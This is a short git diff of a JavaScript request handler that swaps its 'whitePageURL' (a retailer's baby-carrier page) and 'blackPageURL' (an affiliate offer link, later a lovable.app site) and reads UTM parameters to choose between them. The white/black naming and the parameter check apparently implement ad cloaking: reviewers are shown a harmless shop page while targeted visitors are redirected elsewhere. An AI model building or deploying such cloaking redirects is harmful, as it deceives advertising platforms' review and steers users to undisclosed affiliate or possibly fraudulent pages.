@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyone.at/babyschalen/cybex/cloud-g-i-size-beach-blue-plus/2000586037306.html";
-    const blackPageURL = "https://uplevelrewarded.com/aff_c?offer_id=1232&aff_id=145425&source=rda";
+    const whitePageURL = "https://www.smythstoys.com/at/de-at/baby/babytragen-und-babytragetuecher/infantino-babytrage-flip-advanced-4-in-1-mit-laetzchen-schwarz/p/188422";
+    const blackPageURL = "https://whereisthistaking.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,4 +25,5 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
